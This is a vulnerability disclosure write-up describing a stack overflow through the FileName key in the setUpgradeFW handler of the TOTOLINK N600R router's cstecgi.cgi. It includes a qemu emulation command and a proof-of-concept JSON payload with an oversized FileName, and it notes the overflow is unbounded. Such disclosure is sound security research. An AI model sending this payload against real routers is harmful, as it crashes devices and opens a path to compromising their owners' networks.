# TOTOLINK-N600R-setUpgradeFW-StackOverflow

﻿During my internship at Qi An Xin Tiangong Lab, I discovered a StackOverflow vulnerability in the TOTOLINK-N600R router.

By analyzing the cstecgi.cgi file in the cgi-bin directory, I found that the function at address 0x417050 contains a stack overflow vulnerability.

The stack overflow can be triggered by the FileName key value, which leads to a sprintf overflow.

![image-20241216174228998](https://gitee.com/xyqer/pic/raw/master/202412191551327.png)

## How can we simulate a router

﻿Use the following command to simulate with qemu.

```bash
sudo chroot . ./qemu-mips-static -E CONTENT_LENGTH=500 -E QUERY_STRING="action=no" -L /lib ./web_cste/cgi-bin/cstecgi_patch.cgi < ./poc.json
```

﻿The content of the **poc.json** file is as follows:

```json
{"topicurl":"setUpgradeFW","FileName":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","ContentLength":"120"}
```

## Attack result

![image-20241216180144479](https://gitee.com/xyqer/pic/raw/master/202412191551549.png)

![image-20241216180157949](https://gitee.com/xyqer/pic/raw/master/202412191551753.png)

![image-20241216180243753](https://gitee.com/xyqer/pic/raw/master/202412191551344.png)

﻿You can see that the stack length is only 0x1C0, but we overflowed to 0x1D0. If needed, we can overflow more. This overflow does not have a length limit. When using a longer overflow, you only need to modify the FileName key value and the CONTENT_LENGTH size.